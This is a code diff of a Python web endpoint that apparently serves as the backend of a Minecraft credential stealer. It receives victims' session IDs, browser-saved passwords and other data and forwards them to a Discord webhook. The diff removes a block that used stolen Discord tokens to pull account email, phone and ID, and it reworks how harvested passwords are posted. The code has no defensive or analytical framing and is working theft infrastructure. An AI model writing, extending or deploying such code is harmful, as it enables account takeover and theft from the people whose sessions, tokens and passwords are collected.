@@ -65,7 +65,6 @@ class Delivery(Resource):
                 if ips[ip]['count'] < config['ip_ratelimit']:
                     ips[ip]['count'] += 1
                 else:
-                    print("Rejected ratelimited ip")
                     return {'status': 'ratelimited'}, 429
         else:
             ips[ip] = {
@@ -82,7 +81,6 @@ class Delivery(Resource):
 
         mc = args['minecraft']
         if config['validate_session'] and not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
-            print("Rejected invalid session id")
             return {'status': 'invalid session'}, 401
 
         mc_embed = DiscordEmbed(title=config['mc_embed_title'],
@@ -93,57 +91,17 @@ class Delivery(Resource):
         mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
         embeds = split_embed(mc_embed)
 
-        if args['discord']:
-            for tokenjson in args['discord']:
-                token = tokenjson['token']
-                headers = {"Authorization": token}
-                tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
-
-                if tokeninfo.status_code == 200:
-                    discord_embed = DiscordEmbed(title=config['discord_embed_title'],
-                                                 color=int(config['discord_embed_color'], 16))
-                    discord_embed.set_footer(text=config['discord_embed_footer_text'],
-                                             icon_url=config['mc_embed_footer_icon'])
-                    discord_embed.add_embed_field(name="Username", value=cb + f"{tokeninfo.json()['username']}#{tokeninfo.json()['discriminator']}" + cb, inline=True)
-                    discord_embed.add_embed_field(name="ID", value=cb + tokeninfo.json()['id'] + cb, inline=True)
-                    discord_embed.add_embed_field(name="Token", value=cb + token + cb, inline=True)
-                    discord_embed.add_embed_field(name="Email", value=cb + tokeninfo.json()['email'] + cb, inline=True)
-                    discord_embed.add_embed_field(name="Phone", value=cb + "Not linked" + cb if tokeninfo.json()['phone'] is None else cb + tokeninfo.json()['phone'] + cb, inline=True)
-                    discord_embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{tokeninfo.json()['id']}/{tokeninfo.json()['avatar']}.png" if tokeninfo.json()['avatar'] else "https://cdn.discordapp.com/embed/avatars/0.png")
-                    discord_embed.add_embed_field(name="Nitro", value=cb + ("Yes" if tokeninfo.json()['premium_type'] else "No") + cb, inline=True)
-                    embeds.extend(split_embed(discord_embed))
-                else:
-                    print("Rejected invalid token")
-                    return {'status': 'invalid token'}, 401
-
-        password_list = [password for password in args['passwords'] if password['password']]
+        password_list = [password for password in args.get('passwords', []) if 'password' in password]
         if password_list:
-            embed_descriptions = [""]
-            i = 0
-            for j, password in enumerate(password_list):
-                try:
-                    embed_descriptions[i] += f"{password['url']}\nUsername: {cb}{password['username']}{cb}\nPassword: {cb}{password['password']}{cb}\n"
-                except Exception as e:
-                    print(f"Error processing password: {e}")
-                    continue
-                if len(embed_descriptions[i]) > 3500 and j != len(password_list) - 1:
-                    i += 1
-                    embed_descriptions.append("")
-            for description in embed_descriptions:
+            for password in password_list:
                 password_embed = DiscordEmbed(title=config['password_embed_title'],
-                                              color=int(config['password_embed_color'], 16),
-                                              description=description)
+                                              color=int(config['password_embed_color'], 16))
                 password_embed.set_footer(text=config['password_embed_footer_text'],
                                           icon_url=config['password_embed_footer_icon'])
+                password_embed.add_embed_field(name="URL", value=cb + password['url'] + cb, inline=True)
+                password_embed.add_embed_field(name="Username", value=cb + password['username'] + cb, inline=True)
+                password_embed.add_embed_field(name="Password", value=cb + password['password'] + cb, inline=True)
                 embeds.extend(split_embed(password_embed))
-
-        else:
-            password_embed = DiscordEmbed(title=config['password_embed_title'],
-                                          color=int(config['password_embed_color'], 16),
-                                          description="No passwords found")
-            password_embed.set_footer(text=config['password_embed_footer_text'],
-                                      icon_url=config['password_embed_footer_icon'])
-            embeds.append(password_embed)
 
         file_embed = DiscordEmbed(title=config['file_embed_title'],
                                   color=int(config['file_embed_color'], 16))
